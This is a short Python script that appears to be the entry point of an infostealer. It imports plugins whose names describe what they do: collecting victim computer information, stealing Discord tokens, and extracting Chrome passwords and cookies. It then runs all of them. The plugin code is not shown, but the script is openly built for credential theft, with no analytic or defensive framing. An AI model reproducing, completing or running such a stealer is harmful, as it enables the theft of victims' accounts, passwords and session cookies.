
from plugins.get_victim_information import get_computer_information
from plugins.steal_discord_tokens import steal_discord_tokens
from plugins.steal_chrome_information import extract_chrome_cookie, extract_chrome_password

def run_plugins():
    get_computer_information()
    steal_discord_tokens()
    extract_chrome_password()
    extract_chrome_cookie()

if __name__ == '__main__':
    run_plugins()